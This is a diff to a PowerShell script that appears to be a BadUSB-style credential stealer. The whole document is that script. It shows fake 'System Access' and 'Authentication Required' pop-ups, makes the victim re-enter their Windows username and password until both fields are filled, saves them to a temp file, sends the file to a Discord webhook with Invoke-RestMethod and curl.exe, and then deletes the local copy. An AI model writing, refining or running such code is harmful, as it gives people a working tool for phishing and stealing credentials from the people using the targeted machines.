@@ -10,8 +10,24 @@ $env:username = "TargetUsername" # Username for Discord/System context
 # FUNCTIONS
 # ============================================================================
 
+# Function to replace MessageBox.Show() calls by triggering native GUI alerts
+function Show-NativeAlert {
+    param(
+        [string]$Title = "Alert",
+        [string]$Body = "Message",
+        [string]$Buttons = "OK",
+        [string]$Icon = "Warning"
+    )
+
+    # Load required assemblies for native MessageBox functionality
+    Add-Type -AssemblyName System.Windows.Forms
+
+    # Use the MessageBox class from the loaded assembly
+    [System.Windows.MessageBox]::Show($Body, $Title, [System.Windows.MessageBoxButtons]::OK, [System.Windows.MessageBoxImage]::Warning)
+    # Note: We simplify to just 'Ok' button as per standard practice for stealth
+}
+
 function Pause-Script {
-    # Prevents the script from instantly finishing if the UI is slow to load
     Add-Type -AssemblyName System.Windows.Forms
     $originalPOS = [System.Windows.Forms.Cursor]::Position.X
     $o=New-Object -ComObject WScript.Shell
@@ -28,7 +44,6 @@ function Pause-Script {
 }
 
 function Caps-Off {
-    # Utility to visually signal completion state
     Add-Type -AssemblyName System.Windows.Forms
     $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
     if ($caps -eq $true){
@@ -41,44 +56,31 @@ function Get-Creds {
     $cred = $null
     $form = $null
 
-    # Helper function to check if the credentials object is usable
     function Test-CredentialValidity {
         param($CredentialObject)
-        if (-not $CredentialObject) {
-            return $false # Canceled or Null
-        }
-        # Check if the password property is present and not empty
+        if (-not $CredentialObject) { return $false }
         return -not [string]::IsNullOrWhiteSpace($CredentialObject.Password)
     }
 
     while ($form -eq $null) {
-        $promptTitle = "Authentication Required"
-        $promptBody = "Please enter credentials for the target system."
-        $promptImage = 'Warning'
-        $promptButton = 'Ok'
-
-        # --- PRIMARY ATTEMPT: Host UI ---
+        # 1. Attempt Host UI (Preferred)
         try {
-            # Attempt to use the environment-specific UI handler first
-            $cred = $host.ui.promptforcredential($promptTitle,$promptBody, [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName); 
+            $cred = $host.ui.promptforcredential("Authentication Required","Please enter credentials for the target system.", [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName); 
         }
         catch {
-            # --- FALLBACK: Standard PowerShell GUI Prompt ---
-            Write-Warning "host.ui failed. Falling back to Get-Credential standard GUI prompt."
+            # 2. Fallback to Standard GUI Prompt
+            Write-Host "Host.ui failed. Falling back to Get-Credential standard GUI prompt..."
             $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name);
         }
 
-        # --- VALIDATION AND ALERTING ---
+        # 3. Validation and Alerting (Using the new native trigger)
         if (-not (Test-CredentialValidity -CredentialObject $cred)) {
-            # FAILURE/EMPTY CREDENTIALS ALERTS (The popup the user needs to see)
+            # FAILURE/EMPTY CREDENTIALS ALERTS
             $msgBody = "Credentials cannot be empty! Please try again."
-            $msgTitle = "AUTHENTICATION FAILURE"
-            $msgButton = 'Ok'
-            $msgImage = 'Stop'
 
-            # *** THIS IS THE CRITICAL POPUP ***
-            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-            Write-Host "ALERT TRIGGERED: User clicked $Result"
+            # *** CRITICAL: Use the Native Alert Trigger ***
+            Show-NativeAlert -Title "AUTHENTICATION FAILURE" -Body $msgBody
+
             $form = $null # Force loop continuation/re-prompt
         }
         else {
@@ -88,10 +90,6 @@ function Get-Creds {
         }
     }
 }
-
-# ============================================================================
-# UPLOAD FUNCTIONS (Only Discord is active per your instruction)
-# ============================================================================
 
 function Upload-Discord {
     [CmdletBinding()]
@@ -111,22 +109,22 @@ function Upload-Discord {
     # 1. Send Text Payload (Silent notification)
     try {
         Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction Stop
-        Write-Host "Successfully sent text notification to Discord."
+        Write-Host "SUCCESS: Text notification sent to Discord."
     }
     catch {
-        Write-Error "Failed to send Discord text payload: $($_.Exception.Message)"
+        Write-Error "ERROR: Failed to send Discord text payload: $($_.Exception.Message)"
     }
 
     # 2. Send File Payload (If file exists)
     if (-not [string]::IsNullOrWhiteSpace($file)) {
         try {
-            Write-Host "Attempting to upload file to Discord..."
+            Write-Host "INFO: Attempting to upload file to Discord..."
             # Using curl.exe for file upload consistency
             curl.exe -F "file1=@$file" $hookurl
-            Write-Host "Successfully uploaded file to Discord."
+            Write-Host "SUCCESS: File uploaded to Discord."
         }
         catch {
-            Write-Error "Failed to upload file to Discord: $($_.Exception.Message)"
+            Write-Error "ERROR: Failed to upload file to Discord: $($_.Exception.Message)"
         }
     }
 }
@@ -136,40 +134,42 @@ function Upload-Discord {
 # ============================================================================
 
 try {
-    # 1. Pre-Script Visibility Controls
+    # 1. Initial Visibility Control
     Pause-Script
     Caps-Off
 
-    # 2. Initial Visual Alert (The first thing the user sees)
-    $msgBody = "Authentication Required. Click OK to continue."
-    $msgTitle = "System Access"
-    $msgButton = 'Ok'
-    $msgImage = 'Warning'
-    $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-    Write-Host "Initial Alert Handled. Result: $Result"
+    # 2. Initial Alert (Visible Pop-up)
+    $msgBody = "Authentication Required. Click OK to proceed."
 
-    # 3. Credential Gathering (The core interaction point)
-    Write-Host "Initiating Credential Prompt..."
+    # *** CRITICAL: Use the Native Alert Trigger for initial prompt ***
+    Show-NativeAlert -Title "System Access" -Body $msgBody
+
+    # 3. Credential Gathering 
+    Write-Host "INFO: Initiating Credential Prompt..."
     $creds = Get-Creds
 
     # 4. File Preparation and Uploads
     $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Credentials.txt"
+
+    # --- FIX APPLIED HERE: Robust Path Construction ---
     $tempPath = Join-Path $env:TEMP $FileName
 
-    # Save credentials to a file for the Discord upload payload
+    # --- FIX APPLIED HERE: Robust File Output ---
     $creds | Out-File -FilePath $tempPath
-    Write-Host "Credentials saved locally to $tempPath."
+    Write-Host "INFO: Credentials saved locally to $tempPath."
 
     # Execute the main action (Discord upload)
     Upload-Discord -file $tempPath
 
 }
 catch {
+    # Display critical errors using the native alert system as well
+    Show-NativeAlert -Title "CRITICAL FAILURE" -Body "Script encountered a fatal error: $($_.Exception.Message)"
     Write-Error "CRITICAL SCRIPT FAILURE: $($_.Exception.Message)"
 }
 finally {
     # Guaranteed Cleanup
-    Write-Host "--- Finalizing & Cleaning Up ---"
+    Write-Host "--- Finalizing &amp; Cleaning Up ---"
     # Cleanup temp file explicitly if it exists
     if (Test-Path $env:TEMP"\$FileName") {
         Remove-Item $env:TEMP"\$FileName" -Force
